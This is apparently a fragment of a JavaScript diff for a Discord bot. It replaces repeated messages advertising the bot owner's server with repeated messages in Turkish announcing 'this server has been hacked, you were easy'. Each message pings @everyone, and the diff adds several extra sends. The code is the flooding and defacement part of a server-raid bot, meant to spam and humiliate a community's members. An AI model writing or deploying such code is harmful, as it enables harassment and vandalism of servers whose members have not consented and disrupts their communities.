+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
     msg.channel.send(
-      "Bu sunucu botun sahibinin orginal sunucusudur bu sunucuya gelebilirsin ;D https://discord.gg/dCbWgZtRFB"
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
+    );
+    msg.channel.send(
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
+    );
+    msg.channel.send(
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
+    );
+    msg.channel.send(
+      "**__BU SUNUCU HACKLENMİŞTİR KOLAYDINIZ xD__** @everyone :wink: :heart:"
     );
   }
 });
+
 const http = require("http");
 const express = require("express");
 const app = express();
